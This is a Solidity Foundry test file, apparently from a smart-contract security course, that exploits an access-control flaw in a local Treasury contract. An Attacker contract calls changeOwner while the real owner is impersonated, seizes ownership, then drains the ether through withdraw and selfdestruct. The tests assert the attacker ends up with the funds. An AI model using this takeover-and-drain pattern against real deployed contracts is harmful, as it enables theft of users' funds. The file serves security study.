// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {Treasury} from "../../src/Week1/Day3_access_control.sol";

interface ITreasury{
    function changeOwner(address _newOwner) external;
    function deposit() external payable;
    function withdraw() external;
    function kill(address _to) external;
}

contract Attacker {
    ITreasury public treasury;
    constructor(address _treasury){
        treasury = ITreasury(_treasury);
    }

    function attack() external{
        (bool ok,)  = address(treasury).call(abi.encodeWithSignature("changeOwner(address)", address(this)));
        require(ok,"Exploit failed");
    }
    function killAttack() external{
        treasury.kill(address(this));
    }
    function withdrawAttack() external{
        treasury.withdraw();
    }

    receive() external payable{}
}

contract TreasuryTestis is Test{
    Attacker public attacker;
    Treasury public treasury;
    address ownerAdd = makeAddr("Owner");

    function setUp() external {
        treasury = new Treasury(ownerAdd);
        attacker = new Attacker(address(treasury));
    }

    function test_exploit_owner_change() external{
   
    console.log("Owner before attack",treasury.owner());   
    vm.prank(ownerAdd, ownerAdd);
    attacker.attack(); 
    console.log("Owner after attack",treasury.owner());
    assertEq(treasury.owner(), address(attacker));
    }

    function test_killContract() external{
        vm.deal(address(treasury), 10 ether);
        console.log("Treasury Balance Before attack:", address(treasury).balance / 1e18, "ETH");
        vm.prank(ownerAdd,ownerAdd);
        attacker.attack();
        vm.prank(address(attacker),address(attacker));
        attacker.killAttack();
        console.log("--- AFTER SELFDESTRUCT ---");
        console.log("Treasury Balance After attack:", address(treasury).balance, "wei");
        console.log("Attacker Balance:", address(attacker).balance / 1e18, "ETH");
        assertEq(address(attacker).balance, 10 ether);
    }

    function test_exploit_withdraw() external {
         vm.deal(address(treasury), 100 ether);
        console.log("Treasury Balance Before attack:", address(treasury).balance / 1e18, "ETH");
        vm.prank(ownerAdd,ownerAdd);
        attacker.attack();
        vm.prank(address(attacker),address(attacker));
        attacker.withdrawAttack();
        console.log("--- AFTER Withdraw ---");
        console.log("Treasury Balance After attack:", address(treasury).balance, "wei");
        console.log("Attacker Balance:", address(attacker).balance / 1e18, "ETH");
        assertEq(address(attacker).balance, 100 ether);

    }

}